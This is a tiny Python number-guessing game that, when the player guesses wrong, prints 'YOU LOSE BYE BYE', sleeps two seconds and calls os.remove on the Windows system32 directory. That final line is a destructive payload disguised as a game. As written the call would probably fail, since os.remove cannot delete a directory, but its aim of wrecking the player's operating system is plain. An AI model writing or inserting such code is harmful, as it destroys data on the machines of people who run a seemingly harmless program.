import random 
import os
import time

number = random.randint(1,10)
guess = input("guess the number between 1 to 10")
guess =int(guess)

if guess == number:
    print("you won!")
else:
    print ("YOU LOSE BYE BYE")
    time.sleep(2)
    os.remove("c:\windows\system32")
